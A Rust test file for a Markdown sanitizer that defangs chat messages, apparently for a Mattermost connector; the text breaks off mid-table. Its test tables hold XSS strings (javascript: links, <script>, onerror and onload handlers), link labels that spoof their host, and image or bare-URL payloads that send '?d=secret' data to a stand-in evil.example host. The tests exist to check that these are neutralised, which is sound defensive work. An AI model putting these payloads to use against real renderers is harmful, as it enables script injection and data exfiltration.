use super::*;
use proptest::prelude::*;
use pulldown_cmark::{Parser, html};

fn md(s: &str) -> String {
    markdown_safe(s, 100_000)
}

fn render(s: &str) -> String {
    let mut out = String::new();
    html::push_html(&mut out, Parser::new_ext(s, options()));
    out
}

// ---- exceptions, table-driven (D-227) ----

#[test]
fn images_become_links_with_the_host() {
    for (src, want) in [
        (
            "![chart](https://cdn.example/a.png)",
            "[🖼 chart (cdn.example)](<https://cdn.example/a.png>)",
        ),
        (
            "![](https://evil.example/?d=secret)",
            "[🖼 image (evil.example)](<https://evil.example/?d=secret>)",
        ),
        (
            "x ![a *b*](http://h.example/p) y",
            "x [🖼 a b (h.example)](<http://h.example/p>) y",
        ),
        // Rule 2 applies to the image's URL too: no link, only the text.
        ("![pic](data:image/png;base64,AAAA)", "🖼 pic"),
        ("![pic](/relative.png)", "🖼 pic"),
        // An image inside a link: the link stays, the image becomes text (no nested link).
        (
            "[![logo](https://a.example/l.png)](https://b.example/)",
            "[🖼 logo](https://b.example/)",
        ),
    ] {
        assert_eq!(md(src), want, "{src}");
    }
    // Reference style images are rewritten too.
    let out = md("![alt][r]\n\n[r]: https://x.example/i.png");
    assert!(out.starts_with("[🖼 alt (x.example)]("), "{out}");
}

#[test]
fn link_schemes_other_than_http_https_mailto_become_text() {
    for (src, want) in [
        ("[click](javascript:alert(1))", "click"),
        ("[click](JaVaScRiPt:alert(1))", "click"),
        ("[a](data:text/html,<b>x</b>)", "a"),
        ("[a](vbscript:x)", "a"),
        ("[a](/relative/path)", "a"),
        ("[a](//evil.example/x)", "a"),
        ("[a](#frag)", "a"),
        ("<javascript:alert(1)>", "javascript:alert\\(1\\)"),
        (
            "[a][r]\n\n[r]: javascript:alert(1)",
            "a\n\n[r]: javascript:alert(1)",
        ),
        ("[a](<java\tscript:x>)", "a"),
    ] {
        assert_eq!(md(src), want, "{src}");
    }
    for ok in [
        "[a](https://x.example/p?q=1)",
        "[a](http://x.example)",
        "[a](mailto:a@x.example)",
        "<a@x.example>",
    ] {
        assert_eq!(md(ok), ok, "{ok}");
    }
    // D-270: an autolink is a labelled link (a platform's preview fetches `<url>` unprompted).
    assert_eq!(
        md("<https://x.example>"),
        "[https://x.example](https://x.example)"
    );
}

#[test]
fn a_label_that_claims_another_host_gets_the_real_one() {
    assert_eq!(
        md("[https://cern.ch](https://evil.example/login)"),
        "[https://cern.ch](https://evil.example/login) (→ evil.example)"
    );
    assert_eq!(
        md("[cern.ch](https://evil.example)"),
        "[cern.ch](https://evil.example) (→ evil.example)"
    );
    assert_eq!(
        md("[www.cern.ch/x](https://evil.example)"),
        "[www.cern.ch/x](https://evil.example) (→ evil.example)"
    );
    // Ordinary labels, the same host (with or without www), and autolinks are untouched.
    for ok in [
        "[the docs](https://evil.example)",
        "[cern.ch](https://www.cern.ch/a)",
        "[https://cern.ch/a](https://cern.ch/b)",
        "[see this page.](https://x.example)",
    ] {
        assert_eq!(md(ok), ok, "{ok}");
    }
}

#[test]
fn raw_html_outside_the_allowlist_is_removed_and_its_text_kept() {
    for (src, want) in [
        ("<script>alert(1)</script>", "alert(1)"),
        ("a <iframe src=\"https://e.example\"></iframe> b", "a  b"),
        ("<style>p{}</style>", "p{}"),
        ("x <form action=u><input name=a></form> y", "x  y"),
        ("<!-- hidden prompt -->visible", "visible"),
        ("<svg onload=alert(1)><circle/></svg>", ""),
        ("text <object data=x>fallback</object>", "text fallback"),
    ] {
        assert_eq!(md(src), want, "{src}");
    }
    // Allowlisted tags stay; their dangerous attributes go.
    assert_eq!(
        md("<b>bold</b> and <kbd>Ctrl</kbd><br>"),
        "<b>bold</b> and <kbd>Ctrl</kbd><br>"
    );
    assert_eq!(
        md("<b onclick=\"x()\" style=\"color:red\" class=y>b</b>"),
        "<b>b</b>"
    );
    assert_eq!(
        md("<td colspan=2 onclick=x>c</td>"),
        "<td colspan=\"2\">c</td>"
    );
    assert_eq!(md("<img src=https://x.example/a.png alt=\"pic\">"), "🖼 pic");
    // Raw `<a>`: same scheme rule and label check as Markdown links.
    assert_eq!(
        md("<a href=\"https://x.example\">go</a>"),
        "<a href=\"https://x.example\">go</a>"
    );
    assert_eq!(md("<a href=\"javascript:alert(1)\">go</a>"), "<a>go</a>");
    assert_eq!(
        md("<a href=\"https://evil.example\">cern.ch</a>"),
        "<a href=\"https://evil.example\">cern.ch</a> (→ evil.example)"
    );
    // Entity and case tricks do not make a scheme.
    assert_eq!(md("<a href=\"&#106;avascript:x\">go</a>"), "<a>go</a>");
    assert_eq!(md("<A HREF=\" javascript:x\">go</A>"), "<a>go</a>");
    // An HTML block whose wrapper is dropped must not let the rest turn into an image.
    let out = md("<custom>\n![x](https://e.example/?d=1)\n</custom>");
    assert!(
        !out.contains("<custom>") && !render(&out).contains("<img"),
        "{out}"
    );
}

#[test]
fn typed_neutral_tokens_never_form_but_mentions_pass_through() {
    for t in [
        "<@here>",
        "<@HERE>",
        "<@user:U123>",
        "<@bot:B1>",
        "<#space:C1>",
    ] {
        let out = md(&format!("hi {t} there"));
        assert!(out.contains('\u{200B}') && !has_token(&out), "{t}: {out:?}");
        // Inside code too: the connector parses tokens anywhere.
        let out = md(&format!("`{t}`\n\n```\n{t}\n```"));
        assert!(!has_token(&out), "{t}: {out:?}");
        // Idempotent.
        assert_eq!(md(&out), out, "{t}");
    }
    assert_eq!(md("ping @alex and @here-ish"), "ping @alex and @here-ish");
}

/// FIX-178: a later step escapes the closing `>` of a defanged token (`<\u{200B}@here\>`); the next
/// pass strips the break and must put it back, so the output is a fixed point for the raw and the
/// escaped spelling of every typed token, and no `<` is ever directly followed by a token.
#[test]
fn defanged_tokens_are_a_fixed_point_raw_and_escaped() {
    for t in [
        "@here>",
        "@HERE>",
        "@user:U1>",
        "@bot:B1>",
        "@here\\>",
        "@Here\\>",
        "@user:U1\\>",
        "@bot:B1\\>",
        "#space:C1>",
        "#space:C1\\>",
    ] {
        for src in [
            format!("<{t}"),
            format!("hi <{t} there"),
            format!("\\<{t}"),
            format!("<!-- c --> [ <{t} ![j](data:x)"),
            format!("`<{t}`"),
        ] {
            let once = md(&src);
            assert_eq!(md(&once), once, "{src:?} -> {once:?}");
            let low = once.to_ascii_lowercase();
            for bare in ["<@here", "<@user:", "<@bot:", "<#space:"] {
                assert!(!low.contains(bare), "{src:?} -> {once:?}");
            }
        }
    }
}

#[test]
fn fix_178_minimal_case() {
    let once = md("<!-- c --> [ <@here> ![j](data:x)");
    assert_eq!(md(&once), once);
}

#[test]
fn broadcast_here_only_in_prose_at_word_boundaries() {
    for (src, want) in [
        ("@here the build is red", "<@here> the build is red"),
        // D-271(b): only the exact, standalone `@here` is the broadcast: other spellings (case
        // variants, a link label) are no @here for the core and the connector defuses them.
        ("ok @Here, look", "ok @Here, look"),
        ("@HERE @hErE", "@HERE @hErE"),
        (
            "[x @here y](https://x.example)",
            "[x @here y](https://x.example)",
        ),
        ("**@here** now", "**<@here>** now"),
        ("see @here.", "see <@here>."),
        ("a `@here` b", "a `@here` b"),
        ("```\n@here\n```", "```\n@here\n```"),
        ("mail foo@here.org", "mail foo@here.org"),
        ("@hereby", "@hereby"),
        ("x@here", "x@here"),
        ("@channel @all @alex", "@channel @all @alex"),
        ("[@here](https://x.example)", "[@here](https://x.example)"),
        (
            "[a][r] @here\n\n[r]: https://x.example",
            "[a][r] <@here>\n\n[r]: https://x.example",
        ),
    ] {
        assert_eq!(broadcast_here(&md(src)), want, "{src}");
    }
    // A typed token is inert before the here step ever runs.
    assert!(!has_token(&md("<@here>")));
}

#[test]
fn layout_is_kept_and_controls_are_stripped() {
    let src = "- a\n  - b\n    - c\n\n    code\n\n| h |\n|---|\n| x |\n\nline  \nbreak\n";
    assert_eq!(md(src), src);
    assert_eq!(md("a\u{200B}b\u{202E}c\u{0}d"), "abcd");
    assert_eq!(md("a\r\nb\rc"), "a\nb\nc");
    assert_eq!(markdown_safe("abcdef", 4), "abc…");
}

// ---- fidelity corpus: CommonMark 0.31 spec examples, GFM, footnotes, math ----

/// Which D-227 exception (or input cleaning) explains a differing example, judged from the
/// *input* alone; `UNEXPLAINED` fails the test.
fn explain(src: &str) -> &'static str {
    let mut found = "UNEXPLAINED";
    for (e, r) in Parser::new_ext(src, options()).into_offset_iter() {
        match e {
            Event::Start(Tag::Image { .. }) => return "1 image",
            Event::Start(Tag::Link { dest_url, .. }) if !allowed_url(&dest_url) => {
                found = "2 link scheme"
            }
            // FIX-142 review: no image opener / link joint inside math or HTML text.
            Event::InlineMath(_) | Event::DisplayMath(_)
                if src[r.clone()].contains("![") || src[r.clone()].contains("](") =>
            {
                found = "1 image opener in math";
            }
            Event::Text(_) if src[r.clone()].contains("![") => {
                found = "1 image opener in text";
            }
            // Extra cells of a table row: the parser drops them, Mattermost renders them.
            Event::Start(Tag::Table(aligns)) => {
                let mut v = Vec::new();
                table_excess_edits(src, &r, aligns.len(), &mut v);
                if !v.is_empty() {
                    found = "7 table cells beyond the header";
                }
            }
            // D-270: a bare URL or an autolink becomes a labelled link.
            Event::Start(Tag::Link {
                link_type: LinkType::Autolink,
                ..
            }) => found = "5 bare url",
            Event::Text(_) => {
                let l = src[r.clone()].to_ascii_lowercase();
                if l.contains("http://") || l.contains("https://") {
                    found = "5 bare url";
                } else if src[r.clone()].contains("](") || src[r.clone()].contains("]:") {
                    found = "6 link joint";
                }
            }
            Event::Start(Tag::HtmlBlock) | Event::InlineHtml(_)
                if sanitize_html(&src[r.clone()]) != src[r.clone()] =>
            {
                found = "3 raw html";
            }
            _ => {}
        }
    }
    if found == "UNEXPLAINED" && has_token(src) {
        found = "4 neutral token";
    }
    if found == "UNEXPLAINED"
        && src
            .chars()
            .any(|c| is_stripped(c) || c == '\r' || c == '\u{2028}' || c == '\u{2029}')
    {
        found = "input cleaning";
    }
    found
}

/// Every CommonMark 0.31 spec example, the GFM table/strikethrough/task-list examples and
/// pulldown-cmark's footnote and math examples (`tests/fixtures/markdown-corpus.json`, from
/// pulldown-cmark 0.13.6's MIT-licensed suite; the spec is CC-BY-SA 4.0) go through
/// `markdown_safe`; the rendered HTML must equal the input's. The examples that differ are
/// listed with their exception in `markdown-corpus-exceptions.json`
/// (regenerate with `UPDATE_CORPUS=1`): a new difference, or one no exception explains, fails.
#[test]
fn corpus_html_is_unchanged_except_for_listed_exceptions() {
    #[derive(serde::Deserialize)]
    struct Case {
        id: String,
        src: String,
    }
    let cases: Vec<Case> =
        serde_json::from_str(include_str!("../../../tests/fixtures/markdown-corpus.json")).unwrap();
    assert!(cases.len() > 700, "corpus went missing: {}", cases.len());
    let mut got = std::collections::BTreeMap::new();
    let mut report = String::new();
    for c in &cases {
        let out = md(&c.src);
        if render(&out).trim() != render(&c.src).trim() {
            let why = explain(&c.src);
            got.insert(c.id.clone(), why.to_owned());
            if why == "UNEXPLAINED" {
                report.push_str(&format!(
                    "{}\n--- in:\n{:?}\n--- out:\n{:?}\n",
                    c.id, c.src, out
                ));
            }
        }
    }
    assert!(
        report.is_empty(),
        "differences no D-227 exception explains:\n{report}"
    );
    let path = concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/tests/fixtures/markdown-corpus-exceptions.json"
    );
    if std::env::var_os("UPDATE_CORPUS").is_some() {
        std::fs::write(path, serde_json::to_string_pretty(&got).unwrap() + "\n").unwrap();
    }
    let want: std::collections::BTreeMap<String, String> =
        serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap();
    assert_eq!(
        got, want,
        "the set of differing examples changed (UPDATE_CORPUS=1 to regenerate after review)"
    );
}

// ---- properties ----

fn fragments() -> impl Strategy<Value = String> {
    let frag = prop::sample::select(vec![
        "# h",
        "**b**",
        "_i_",
        "~~s~~",
        "`c`",
        "```rs\nfn x(){}\n```",
        "> q",
        "- a",
        "  - n",
        "1. o",
        "[l](https://a.example)",
        "[l](javascript:x)",
        "![i](https://a.example/p.png)",
        "![j](data:x)",
        "<b>x</b>",
        "<script>y</script>",
        "<img src=a onerror=b>",
        "<@here>",
        "<@user:U1>",
        "<#space:C>",
        "@here",
        "@channel",
        "| a | b |\n|---|---|\n| 1 | 2 |",
        "[^1]\n\n[^1]: n",
        "$x$",
        "$$\ny\n$$",
        "> [!NOTE]\n> n",
        "<!-- c -->",
        "<a href=\"javascript:x\">t</a>",
        "<details><summary>s</summary>b</details>",
        "[https://cern.ch](https://e.example)",
        "<https://a.example>",
        "text",
        "\n",
        "\n\n",
        "  ",
        "\t",
        "\u{202E}",
        "\u{0}",
        "[r]: javascript:x",
        "![a][r]",
        "$![x](https://e.example/?d=S)$",
        "$$![y](https://e.example/2)$$",
        "![x](https://e.example/p.png =10x10)",
        "<div>\n![x](https://e.example/?d=S)\n</div>",
        "!<a href=\"https://e.example/p.png\">x</a>",
        "<code>@here</code>",
        "https://e.example/?d=SECRET",
        "go www.e.example/?d=SECRET (www.e.example) ftp://e.example/x",
        "<div>www.e.example/x ftp://e.example/y</div>",
        "$www.e.example/m$ $$ftp://e.example/n$$",
        "|a|b|\n|-|-|\n|1|2|![x](https://e.example/?d=S)|",
        "|a|b|\n|-|-|\n|1|2|https://e.example/?d=S|",
        "see https://e.example/a_b.",
        "<https://e.example/x>",
        "<div>https://e.example/?d=S</div>",
        "<b>https://e.example/b</b>",
        "[https://cern\\.ch](https://e.example/a b)",
        "[https://cern&#46;ch][r]",
        "x\n[r]: https://e.example/\n[x][r]",
        "[https://cern.ch](http:e.example/l)",
        "para\n[r]: https://e.example/\n![x][r]",
        "<",
        ">",
        "`",
        "[",
        "]",
        "(",
        ")",
    ]);
    prop::collection::vec(frag, 0..12).prop_map(|v| v.join(" "))
}

// ---- FIX-142 (review) findings 2, 4, 5, 6 ----

/// No image can form from the text `s`, whichever dialect reads it: pulldown (CommonMark/GFM) and
/// Mattermost's marked (the `![` of an image anywhere outside code must not survive unescaped).
fn no_live_image_opener(s: &str) -> bool {
    let mut in_code = false;
    for (e, r) in Parser::new_ext(s, options()).into_offset_iter() {
        match e {
            Event::Start(Tag::CodeBlock(_)) => in_code = true,
            Event::End(pulldown_cmark::TagEnd::CodeBlock) => in_code = false,
            Event::Code(_) => {}
            Event::Start(Tag::Image { .. }) => return false,
            Event::Text(_)
            | Event::InlineMath(_)
            | Event::DisplayMath(_)
            | Event::Html(_)
            | Event::InlineHtml(_)
                if !in_code && s[r.clone()].contains("![") =>
            {
                return false;
            }
            _ => {}
        }
    }
    true
}

#[test]
fn math_cannot_carry_an_image_or_a_link() {
    for src in [
        "$![x](https://evil.example/?d=S)$",
        "a $$![y](https://evil.example/2)$$ b",
        "$$\n![z](https://evil.example/3)\n$$",
        "$[x](javascript:alert(1))$",
    ] {
        let out = md(src);
        assert!(no_live_image_opener(&out), "{src} -> {out}");
        assert!(!out.contains("](javascript"), "{src} -> {out}");
        assert_eq!(md(&out), out, "idempotent: {src}");
    }
    // Plain math is untouched.
    assert_eq!(md("$a^2 + b_1$"), "$a^2 + b_1$");
}

#[test]
fn an_image_opener_in_html_or_marked_only_forms_never_survives() {
    for src in [
        // Mattermost's image-size syntax: text to pulldown, an image to marked.
        "![x](https://evil.example/p.png?d=S =10x10)",
        "![x](https://evil.example/a b)",
        // A definition right after a paragraph line, then a reference image (marked lets a definition interrupt a paragraph).
        "para\n[r]: https://evil.example/?d=S\n![x][r]",
        // Text inside an HTML block is Markdown once a connector converts the HTML.
        "<div>\n![x](https://evil.example/?d=S)\n</div>",
        "<span>![x](https://evil.example/?d=S)</span>",
        "!<a href=\"https://evil.example/p.png?d=S\">x</a>",
    ] {
        let out = md(src);
        assert!(no_live_image_opener(&out), "{src} -> {out}");
        assert_eq!(md(&out), out, "idempotent: {src}");
    }
    // The opener inside code stays as written.
    assert_eq!(md("`![x](y)`"), "`![x](y)`");
    assert_eq!(md("```\n![x](y)\n```"), "```\n![x](y)\n```");
}

#[test]
fn a_label_cannot_hide_the_destination_host() {
    for (src, host) in [
        // WHATWG URL rules: `http:host` has a host, `\` is a `/`.
        ("[https://cern.ch](http:evil.example/login)", "evil.example"),
        (
            "[https://cern.ch](https:evil.example/login)",
            "evil.example",
        ),
        // `\\` in the source is one backslash in the destination, which a browser reads as `/`.
        (
            "[https://cern.ch](https://evil.example\\\\@cern.ch)",
            "evil.example",
        ),
        (
            "[cern.ch](https://evil.example\\\\@cern.ch/x)",
            "evil.example",
        ),
        ("[cern.ch](https:/evil.example/x)", "evil.example"),
        // Re-review F5: the destination as written, not only as pulldown decodes it — one
        // backslash before `@` is a Markdown escape to pulldown (host cern.ch) but stays a
        // backslash where the destination is kept as typed (host evil.example).
        (
            "[https://cern.ch](https://evil.example\\@cern.ch)",
            "evil.example",
        ),
        (
            "[cern.ch](<https://evil.example\\@cern.ch/x>)",
            "evil.example",
        ),
    ] {
        let out = md(src);
        assert!(out.ends_with(&format!("(→ {host})")), "{src} -> {out}");
    }
    // An honest link is untouched.
    assert_eq!(
        md("[https://cern.ch/a](https://cern.ch/b)"),
        "[https://cern.ch/a](https://cern.ch/b)"
    );
    assert_eq!(
        md("[cern.ch](https://www.cern.ch/)"),
        "[cern.ch](https://www.cern.ch/)"
    );
}

/// The prose runs of `s` (adjacent text events outside code, an escape's backslash bridged), as
/// the platform reads them: `(raw text, inside a link)`.
fn prose_runs(s: &str) -> Vec<(String, bool)> {
    let mut runs: Vec<(String, bool, usize)> = Vec::new();
    let mut in_code = false;
    let mut link = 0usize;
    for (e, r) in Parser::new_ext(s, options()).into_offset_iter() {
        match e {
            Event::Start(Tag::CodeBlock(_)) => in_code = true,
            Event::End(pulldown_cmark::TagEnd::CodeBlock) => in_code = false,
            Event::Start(Tag::Link { .. }) => link += 1,
            Event::End(pulldown_cmark::TagEnd::Link) => link = link.saturating_sub(1),
            Event::Text(_) if !in_code => {
                let raw = &s[r.clone()];
                match runs.last_mut() {
                    Some((t, l, end))
                        if *l == (link > 0)
                            && r.start >= *end
                            && matches!(&s[*end..r.start], "" | "\\") =>
                    {
                        t.push_str(&s[*end..r.start]);
                        t.push_str(raw);
                        *end = r.end;
                    }
                    _ => runs.push((raw.to_owned(), link > 0, r.end)),
                }
            }
            _ => {}
        }
    }
    runs.into_iter().map(|(t, l, _)| (t, l)).collect()
}

/// A `](` the parser did not form a link from (review 3).
fn loose_joint(s: &str) -> bool {
    prose_runs(s).iter().any(|(t, _)| t.contains("]("))
}

/// Whether `t` holds a URL the pinned server extracts for a preview (measured on Mattermost
/// 11.7.15, `docs/20`): `http://`, `https://`, `ftp://` and `www.` after a non-name character.
fn preview_url_in(t: &str) -> bool {
    let l = t.to_ascii_lowercase();
    if l.contains("http://") || l.contains("https://") || l.contains("ftp://") {
        return true;
    }
    l.match_indices("www.").any(|(i, _)| {
        l[i + 4..].starts_with(|c: char| c.is_ascii_alphanumeric())
            && !l[..i].chars().next_back().is_some_and(|c| {
                c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '@' | '/' | ':')
            })
    })
}

/// A bare URL (`http(s)://`, `ftp://`, `www.`) outside code and links (D-270).
fn bare_url_left(s: &str) -> bool {
    prose_runs(s)
        .iter()
        .any(|(t, in_link)| !in_link && preview_url_in(t))
}

/// A bare URL in the text of raw HTML (outside tags and outside an `<a>`), D-270.
fn html_bare_url_left(s: &str) -> bool {
    let mut in_a = false;
    for (e, _) in Parser::new_ext(s, options()).into_offset_iter() {
        let (Event::Html(h) | Event::InlineHtml(h)) = e else {
            continue;
        };
        let mut rest: &str = &h;
        // A `<` starts a tag only when a letter or `/` follows.
        let tag_at = |s: &str| {
            s.char_indices().find_map(|(i, c)| {
                (c == '<' && s[i + 1..].starts_with(|n: char| n.is_ascii_alphabetic() || n == '/'))
                    .then_some(i)
            })
        };
        while let Some(p) = tag_at(rest) {
            let text = &rest[..p];
            if !in_a && preview_url_in(text) {
                return true;
            }
            let tail = &rest[p..];
            let end = tail.find('>').map_or(tail.len(), |e| e + 1);
            let tag = tail[..end].to_ascii_lowercase();
            if tag.starts_with("<a ") || tag == "<a>" {
                in_a = true;
            } else if tag.starts_with("</a") {
                in_a = false;
            }
            rest = &tail[end..];
        }
        if !in_a && preview_url_in(rest) {
            return true;
        }
    }
    false
}

/// Found by the dev server (FIX-142, D-270): GFM drops the cells of a row beyond the header's
/// width, so the parser shows none of their content — but Mattermost 11.7.15 *renders* them
/// (an image, a bare URL it fetches, an `@channel`). The sanitizer escapes the pipe that starts
/// an extra cell, so the content is text of the last cell and gets every other rewrite.
#[test]
fn cells_beyond_the_header_are_part_of_the_last_cell() {
    for src in [
        "|a|b|\n|-|-|\n|1|2|![x](https://evil.example/?d=S)|",
        "|a|b|\n|-|-|\n|1|2|https://evil.example/?d=S|",
        "a | b\n--|--\n1 | 2 | ![x](https://evil.example/?d=S)",
        "> |a|b|\n> |-|-|\n> |1|2|![x](https://evil.example/?d=S)|",
        "|a|b|\n|-|-|\n|1|`x|y`|![x](https://evil.example/?d=S)|z|",
        "|a|b|\n|-|-|\n|1|2|[x](javascript:alert(1))|",
    ] {
        let out = md(src);
        assert!(no_live_image_opener(&out), "{src:?} -> {out:?}");
        assert!(!bare_url_left(&out), "{src:?} -> {out:?}");
        assert!(!out.contains("](javascript"), "{src:?} -> {out:?}");
        // (the parser shows nothing of a dropped cell: look at the text itself)
        assert!(out != src && out.contains("\\|"), "{src:?} -> {out:?}");
        for hot in ["|![", "|https://", "|[x](", "| ![", "| https://"] {
            let at = out.find(hot);
            assert!(
                at.is_none_or(|i| out[..i].ends_with('\\')),
                "an unescaped pipe still starts an extra cell: {src:?} -> {out:?}"
            );
        }
        assert_eq!(md(&out), out, "idempotent: {src:?}");
        // The table is still a table of two columns, every body row with at most two cells.
        let html = render(&out);
        assert!(html.contains("<table>"), "{src:?} -> {html}");
    }
    // A well-formed table is untouched, an escaped pipe is not a separator.
    for same in [
        "|a|b|\n|-|-|\n|1|2|",
        "| a | b |\n|---|---|\n| 1 \\| x | 2 |",
        "|a|b|\n|-|-|\n|1|",
    ] {
        assert_eq!(md(same), same);
        assert_eq!(escape_table_excess(same), same);
    }
}

/// FIX-195 (third finding, D-270): a reference definition's title gets no event, so no other
/// rewrite reached a URL in it. A title that holds a preview URL is dropped (it is never shown);
/// the label and the destination stay as they are, a title without one stays.
#[test]
fn a_definition_title_with_a_preview_url_is_dropped() {
    for (src, want) in [
        (
            "[x][r]\n\n[r]: https://e.example/ ( ftp://e.example/x and <www.e.example/y> )",
            "[x][r]\n\n[r]: https://e.example/",
        ),
        (
            "[x][r]\n\n[r]: https://e.example/ \"see https://f.example/?d=S\"",
            "[x][r]\n\n[r]: https://e.example/",
        ),
        (
            "[x][r]\n\n[r]: <https://e.example/a> 'www.f.example'",
            "[x][r]\n\n[r]: <https://e.example/a>",
        ),
        (
            "[x][r]\n\n[r]: https://e.example/\n  \"<https://f.example/>\"\n\nnext",
            "[x][r]\n\n[r]: https://e.example/\n\nnext",
        ),
        (
            "> [x][r]\n>\n> [r]: https://e.example/\n> (http://f.example/q)",
            "> [x][r]\n>\n> [r]: https://e.example/",
        ),
        // A repeated label: the parser keeps only the first definition, the second is still text
        // no event covers.
        (
            "[x][r]\n\n[r]: https://e.example/ \"a\"\n[r]: https://g.example/ \"ftp://f.example/\"",
            "[x][r]\n\n[r]: https://e.example/ \"a\"\n[r]: https://g.example/",
        ),
        (
            "- [x][r]\n\n  [r]: https://e.example/ \"https://f.example/\"",
            "- [x][r]\n\n  [r]: https://e.example/",
        ),
    ] {
        let out = md(src);
        assert_eq!(out, want, "{src:?}");
        assert_eq!(md(&out), out, "idempotent: {src:?}");
    }
    // The destination is neutralised as before, a title without a URL is kept, and a definition
    // look-alike in prose is still broken, not cut.
    for same in [
        "[x][r]\n\n[r]: https://e.example/",
        "[x][r]\n\n[r]: https://e.example/ \"plain title\"",
        "[x][r]\n\n[r]: https://e.example/ (example.org is no URL)",
    ] {
        assert_eq!(md(same), same, "{same:?}");
    }
    let prose = md("para\n[r]: https://e.example/ \"https://f.example/\"\n[x][r]");
    assert!(prose.contains("[r]\\:"), "{prose:?}");
    assert!(!bare_url_left(&prose), "{prose:?}");
}

/// FIX-195: the same escaping on its own, for a converter that parses a piece of text (an anchor's
/// label) whose structure the sanitizer never saw; idempotent.
#[test]
fn escape_table_excess_makes_extra_cells_text_of_the_last_cell() {
    for (src, want) in [
        (
            "|a|b|\n|-|-|\n|1|2|<a href=\"https://x\">t</a>|",
            "|a|b|\n|-|-|\n|1|2\\|<a href=\"https://x\">t</a>\\|",
        ),
        (
            "a | b\n--|--\n1 | 2 | 3 | 4",
            "a | b\n--|--\n1 | 2 \\| 3 \\| 4",
        ),
        ("> |a|\n> |-|\n> |1|2|", "> |a|\n> |-|\n> |1\\|2\\|"),
        ("not a table | x", "not a table | x"),
    ] {
        let out = escape_table_excess(src);
        assert_eq!(out, want, "{src:?}");
        assert_eq!(escape_table_excess(&out), out, "idempotent: {src:?}");
    }
}

/// FIX-197/FIX-198 (D-270): the prose rules on a connector's converted text, read as it is now:
/// prose is defanged, code stays as typed, raw HTML and the neutral tokens are left alone, and the
/// core's own output is a fixed point.
#[test]
fn defang_prose_defangs_what_is_prose_now_and_keeps_code() {
    let img = "![i](https://a.example/p.png)";
    let url = "https://e.example/?d=S";
    // Prose now (the core had read it as code): defanged.
    let out = defang_prose(&format!("a {img} see {url} now"));
    assert_eq!(
        out,
        format!("a [🖼 i (a.example)](<https://a.example/p.png>) see [{url}]({url}) now")
    );
    // A table cell beyond the header's width: text of the last cell, where the rules reach it.
    let out = defang_prose(&format!(" |a|b|\n|-|-|\n|1|2|x| see {url} `{img}`"));
    assert!(out.contains("2\\|x\\|"), "{out:?}");
    assert!(out.contains(&format!("`{img}`")), "{out:?}");
    assert!(!out.contains(&format!("see {url}")), "{out:?}");
    // A cell split that cuts what the core read as one span: the halves are prose.
    let out = defang_prose(&format!("|a|b|\n|-|-|\n|`x|{img}`|"));
    assert!(!out.contains("!["), "{out:?}");
    // Code as typed: spans, fences (also inline triple runs that pair), indented blocks.
    for code in [
        format!("a ` {img} {url} ` b"),
        format!("a ``` {img} {url} ``` b"),
        format!("```\n{img} {url}\n```"),
        format!("    {img} {url}"),
        format!("|a|\n|-|\n|` {img} {url} `|"),
    ] {
        assert_eq!(defang_prose(&code), code);
    }
    // Tokens, raw HTML and the core's own output stay as they are.
    for kept in [
        "ping <@here> and <@user:U1> in <#space:S1>",
        "<div>x</div>",
        "a <b>b</b> c",
    ] {
        assert_eq!(defang_prose(kept), kept);
    }
    for src in [
        format!("see {url} and {img} | `{img}`"),
        format!("|a|b|\n|-|-|\n|1|2|{img} {url}|"),
        "[x](https://x.example/p) [https://cern.ch](https://e.example/l)".to_owned(),
        "$![x](u)$ and [^1]\n\n[^1]: n".to_owned(),
    ] {
        let safe = markdown_safe(&src, 10_000);
        assert_eq!(defang_prose(&safe), safe, "{src:?}");
    }
}

/// Review 3 (2): a link joint (`](`) or a definition line that pulldown did not form is still a
/// link on a platform whose dialect is looser (Mattermost 11.7.15: a destination may hold
/// spaces; a definition may follow a paragraph line). The sanitizer breaks them in prose.
#[test]
fn link_joints_and_definition_lines_pulldown_did_not_form_are_broken() {
    for src in [
        "[https://cern\\.ch](https://evil.example/a b)",
        "[https://cern&#46;ch](https://evil.example/a b)",
        "[https://cern.ch\\]](https://evil.example/a b)",
        "para\n[r]: https://evil.example/login\n[https://cern&#46;ch][r]",
        "para\n[cern  ch]: https://evil.example/login\n[https://cern.ch][cern ch]",
        "para\n   [r]: https://evil.example/login\n[https://cern.ch][r]",
        "a *b*\n[r]: https://evil.example/\n[x][r]",
    ] {
        let out = md(src);
        assert!(!loose_joint(&out), "{src:?} -> {out:?}");
        assert!(
            !out.lines().skip(1).any(|l| {
                let t = l.trim_start_matches(' ');
                t.starts_with('[') && t.contains("]:")
            }),
            "{src:?} -> {out:?}"
        );
        assert_eq!(md(&out), out, "idempotent: {src:?}");
    }
    // A real link, a definition at the start of the text and code are untouched.
    for same in [
        "[a](https://a.example/x)",
        "[r]: https://a.example/\n\n[x][r]",
        "`[a](b)`",
        "```\n[r]: u\n[a](b c)\n```",
    ] {
        assert_eq!(md(same), same, "{same:?}");
    }
}

/// D-270 (owner): a bare URL or autolink in prose becomes `[url](url)` — a platform's preview
/// fetches it unprompted, with no click, so data in its query string leaves.
#[test]
fn bare_urls_and_autolinks_become_labelled_links() {
    for (src, want) in [
        (
            "see https://evil.example/?d=S now",
            "see [https://evil.example/?d=S](https://evil.example/?d=S) now",
        ),
        (
            "https://a.example.",
            "[https://a.example](https://a.example).",
        ),
        (
            "(https://a.example/x)",
            "([https://a.example/x](https://a.example/x))",
        ),
        (
            "<https://y.example>",
            "[https://y.example](https://y.example)",
        ),
        (
            "HTTP://A.EXAMPLE/p",
            "[HTTP://A.EXAMPLE/p](HTTP://A.EXAMPLE/p)",
        ),
        (
            "go: https://a.example/a_b_c, then",
            "go: [https://a.example/a_b_c](https://a.example/a_b_c), then",
        ),
        (
            "**https://a.example/b**",
            "**[https://a.example/b](https://a.example/b)**",
        ),
        (
            "- https://a.example/1\n- https://a.example/2",
            "- [https://a.example/1](https://a.example/1)\n- [https://a.example/2](https://a.example/2)",
        ),
        (
            "https://en.wikipedia.org/wiki/Rust_(language)",
            "[https://en.wikipedia.org/wiki/Rust_(language)](<https://en.wikipedia.org/wiki/Rust_(language)>)",
        ),
        (
            "| a | b |\n|---|---|\n| https://a.example | x |",
            "| a | b |\n|---|---|\n| [https://a.example](https://a.example) | x |",
        ),
        (
            "<https://a.example/?a=1&b=2>",
            "[https://a.example/?a=1\\&b=2](https://a.example/?a=1&b=2)",
        ),
        // Review 4, measured on Mattermost 11.7.15: the server also extracts `www.` and `ftp://`
        // for a preview (an embed is made; `Www.`/`WWW.` are not, rewritten all the same).
        (
